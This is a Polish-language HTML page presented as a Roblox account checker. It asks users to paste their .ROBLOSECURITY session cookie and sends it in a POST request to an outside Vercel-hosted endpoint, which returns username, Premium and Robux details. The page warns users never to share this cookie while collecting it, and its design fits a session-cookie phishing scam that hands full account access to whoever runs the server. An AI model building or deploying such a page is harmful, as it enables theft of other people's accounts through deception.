<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Checker – nazwa, Premium, Robux</title>
  <style>
    body { 
      font-family: Arial, sans-serif; 
      max-width: 600px; 
      margin: 40px auto; 
      padding: 20px; 
      background: #111; 
      color: #eee; 
      line-height: 1.5;
    }
    h2 { color: #1e90ff; }
    textarea { 
      width: 100%; 
      height: 160px; 
      background: #222; 
      color: #eee; 
      border: 1px solid #444; 
      padding: 12px; 
      font-family: monospace; 
      resize: vertical; 
      border-radius: 4px;
    }
    button { 
      padding: 14px 40px; 
      background: #1e90ff; 
      border: none; 
      color: white; 
      font-size: 18px; 
      cursor: pointer; 
      margin: 20px 0; 
      border-radius: 6px;
    }
    button:hover { background: #0c7ae6; }
    #result { 
      margin-top: 25px; 
      padding: 25px; 
      background: #1a1a1a; 
      border: 1px solid #444; 
      border-radius: 10px; 
      min-height: 140px;
    }
    .error { color: #ff4d4d; font-weight: bold; }
    .success { color: #00ff9d; font-weight: bold; }
    .info { color: #ddd; }
    strong { color: #ffcc00; }
  </style>
</head>
<body>
<h2>Roblox – sprawdź dane konta z .ROBLOSECURITY</h2>

<p style="color:#ffcc00; font-weight:bold; font-size:1.1em;">
  ⚠️ UWAGA: .ROBLOSECURITY to TWÓJ KLUCZ DO KONTA – NIGDY NIKOMU GO NIE DAWAJ!
</p>

<textarea id="cookie" placeholder="Wklej tutaj sam ciąg .ROBLOSECURITY (bez '.ROBLOSECURITY=')..."></textarea>

<button onclick="sprawdz()">Sprawdź konto</button>

<div id="result"></div>

<script>
async function sprawdz() {
  const cookieVal = document.getElementById('cookie').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (cookieVal.length < 200) {
    result.innerHTML = '<span class="error">Cookie za krótkie – wklej poprawne .ROBLOSECURITY!</span>';
    return;
  }

  result.innerHTML = '<span class="info">Trwa sprawdzanie... proszę czekać</span>';

  try {
    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {  // ← zmień na swój URL jeśli hostujesz gdzie indziej
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie: cookieVal })
    });

    const json = await resp.json();

    if (json.error) {
      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
    } else if (json.success) {
      result.innerHTML = `
        <span class="success">✓ Połączono pomyślnie!</span><br><br>
        <b>Nazwa użytkownika:</b> ${json.username}<br>
        <b>Display Name:</b> ${json.displayName}<br>
        <b>User ID:</b> ${json.userId}<br>
        <b>Roblox Premium:</b> ${json.hasPremium 
          ? '<span style="color:#00ff9d;">TAK ✅</span>' 
          : '<span style="color:#ff4d4d;">NIE ❌</span>'}<br>
        <b>Robux na koncie:</b> <span style="color:#ffcc00; font-size:1.2em;">${json.robux.toLocaleString('pl-PL')}</span> ₪
      `;
    } else {
      result.innerHTML = '<span class="error">Nieznana odpowiedź serwera</span>';
    }
  } catch (e) {
    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
  }
}
</script>
</body>
</html>
